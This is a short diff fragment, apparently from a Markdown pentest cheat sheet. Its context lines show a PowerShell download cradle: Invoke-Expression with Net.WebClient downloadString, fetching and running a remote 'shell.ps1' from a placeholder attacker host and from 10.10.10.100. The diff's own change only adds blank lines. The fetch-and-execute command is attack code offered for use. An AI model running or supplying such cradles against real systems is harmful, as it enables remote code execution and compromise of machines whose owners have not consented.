@@ -20,3 +20,5 @@ Invoke-Expression (New-Object Net.WebClient).downloadString("http://$_ATTACKER_I
 ```
 PS C:\> Invoke-Expression (New-Object Net.WebClient).downloadString("http://10.10.10.100/shell.ps1")
 ```
+
+
